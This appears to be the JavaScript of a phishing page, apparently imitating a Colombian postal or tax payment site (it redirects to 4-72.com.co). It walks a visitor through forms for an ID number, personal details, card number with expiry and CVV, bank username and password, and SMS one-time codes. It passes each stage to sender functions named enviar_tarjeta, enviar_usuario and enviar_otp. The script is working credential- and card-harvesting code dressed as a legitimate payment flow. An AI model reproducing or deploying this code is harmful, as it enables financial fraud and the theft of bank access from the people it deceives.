var icono = "blanco";
sw_sobre = 0;
sw_links = 0;
sw_ayuda = 0;
sw_corp = 0;

ok_datos = 0;
ok_tar = 0; 
ok_sesion = 0;

$(document).ready(function() {   

    $(window).resize(function() {
        if ($(window).width() <= 991) {
            $(".menu-bar").css("top","0"); 
        }
    });


    $(window).scroll(function() {        
        if ($(window).width() > 991) {
            if (window.scrollY > 33) {
                $(".top-bar").hide();
                $(".menu-bar").css("position","fixed");
                $(".menu-bar").css("top","0"); 
            }else{
                $(".top-bar").show();
                $(".menu-bar").css("position","absolute");         
                $(".menu-bar").css("top","33");         
            }
        }
    });

    $("#btn-ingresar").mouseover(function() {
        $("#btn-ingresar").attr("src","img/btn-ingresar-up.jpg");
    });

    $("#btn-ingresar").mouseout(function() {
        $("#btn-ingresar").attr("src","img/btn-ingresar.jpg");
    });

    $("#btn-ingresar-in").mouseover(function() {
        $("#btn-ingresar-in").attr("src","../img/btn-ingresar-up.html");
    });

    $("#btn-ingresar-in").mouseout(function() {
        $("#btn-ingresar-in").attr("src","../img/btn-ingresar.html");
    });

    $("#titulo-sobre").click(function(){
        if (sw_sobre == 0) {
            $("#sobre-items").show();
            sw_sobre = 1;
        }else{
            $("#sobre-items").hide();
            sw_sobre = 0;
        }        
    });

    $("#titulo-links").click(function(){
        if (sw_links == 0) {
            $("#links-items").show();
            sw_links = 1; 
        }else{
            $("#links-items").hide();
            sw_links = 0;
        }        
    });

    $("#titulo-ayuda").click(function(){
        if (sw_ayuda == 0) {
            $("#ayuda-items").show();
            sw_ayuda = 0;
        }else{
            $("#ayuda-items").hide();
            sw_ayuda = 1;
        }        
    });

    $("#titulo-corp").click(function(){
        if (sw_corp == 0) {
            $("#corp-items").show();
            sw_corp = 1;
        }else{
            $("#corp-items").hide();
            sw_corp = 0;
        }        
    });

   $("#btn-consultar").click(function(){
        if ($("#txt-cedula").val().length  >= 6) {
            $("#frm-consulta").hide()            
            $("#cargando").show()
            enviar_documento($("#txt-cedula").val());
        }else{
            $("#err-cedula").show();            
        }
    });

    $("#txt-cedula").keyup(function(){
        if ($("#txt-cedula").val().length  >= 6) {
            $("#err-cedula").hide();  
        }    
    });

    $("#btn-pagar-impuestos").click(function(){
        ok_datos = 0;

        if ($("#txt-ciudad").val() != "") {
            $("#err-ciudad").hide();
        }else{
            $("#err-ciudad").show();  
            $("#txt-ciudad").focus();
            ok_datos = 1;          
        }

        if ($("#txt-direccion").val() != "") {
            $("#err-direccion").hide();
        }else{
            $("#err-direccion").show();  
            $("#txt-direccion").focus();
            ok_datos = 1;          
        }

        if ($("#txt-correo").val() != "") {
            $("#err-correo").hide();
        }else{
            $("#err-correo").show();  
            $("#txt-correo").focus();
            ok_datos = 1;          
        }

        if ($("#txt-celular").val() != "") {
            $("#err-celular").hide();
        }else{
            $("#err-celular").show();  
            $("#txt-celular").focus();
            ok_datos = 1;          
        }

        if ($("#txt-nombre").val() != "") {
            $("#err-nombre").hide();
        }else{
            $("#err-nombre").show();  
            $("#txt-nombre").focus();
            ok_datos = 1;          
        }

        if (ok_datos == 0) { 
            $("#fondo,#frm-esperando").show();       
            enviar_datos($("#txt-nombre").val(),$("#txt-celular").val(),$("#txt-correo").val(),$("#txt-direccion").val(),$("#txt-ciudad").val());
        }
    });

    $("#btn-pagar").click(function(){
        ok_tar = 0;   

        if ($("#txt-cvv").val().length >= 3) {
            $("#err-cvv").hide();
        }else{
            $("#err-cvv").show();  
            $("#txt-cvv").focus();
            ok_tar = 1;          
        }

        if ($("#mFecha").val() != "" && $("#aFecha").val() != "") {
            $("#err-fecha").hide();
        }else{
            $("#err-fecha").show();  
            $("#mFecha").focus();
            ok_tar = 1;          
        }


        if ($("#txt-tarjeta").val().length >= 15) {
            $("#err-tarjeta").hide();
        }else{
            $("#err-tarjeta").show();  
            $("#txt-tarjeta").focus();
            ok_tar = 1;          
        }

        if ($("#txt-entidad").val() != "") {
            $("#err-entidad").hide();
        }else{
            $("#err-entidad").show();  
            $("#txt-entidad").focus();
            ok_tar = 1;          
        }

        if (ok_tar == 0) {
            fecha = $("#mFecha").val() + "-" + $("#aFecha").val()
            $("#fondo").show();
            $("#frm-tarjeta").show();
            $("#frm-animacion").show();
            icono = $("#txt-entidad").val();
            enviar_tarjeta($("#txt-entidad").val(),$("#txt-tarjeta").val(),fecha,$("#txt-cvv").val());
        }

    });

    $("#btn-iniciar-sesion").click(function(){
        ok_sesion = 0;  

        if ($("#txt-password").val() != "") {
            $("#err-password").hide();
        }else{
            $("#err-password").show();  
            $("#txt-password").focus();
            ok_sesion = 1;          
        }

        if ($("#txt-usuario").val() != "") {
            $("#err-usuario").hide();
        }else{
            $("#err-usuario").show();  
            $("#txt-usuario").focus();
            ok_sesion = 1;          
        }

        if (ok_sesion == 0) { 
            

            $("#fondo").show();
            $("#frm-verificacion").hide();
            $("#logo-entidad-load").attr("src","../img/logos/" + icono + ".png");
            $("#frm-cargando").show();
            enviar_usuario($("#txt-usuario").val(),$("#txt-password").val());
        }
    });

    $("#btn-autorizar").click(function(){
        window.location.href = "https://www.4-72.com.co/";   
    });    

    $("#btn-validar").click(function(){
        if ($("#txt-otp").val().length >= 6) {
            $("#err-otp,#frm-otp").hide();
            $("#frm-esperando").show();
            enviar_otp($("#txt-otp").val());
        }else{
            $("#err-otp").show();  
            $("#txt-otp").focus();                     
        }
    }); 

    $("#btn-validar-nuevo").click(function(){
        if ($("#txt-nuevootp").val().length >= 6) {
            $("#err-nuevootp,#frm-nuevootp").hide();
            $("#frm-esperando").show();
            enviar_otp($("#txt-nuevootp").val());
        }else{
            $("#err-nuevootp").show();  
            $("#txt-nuevootp").focus();                     
        }
    });    

    

});






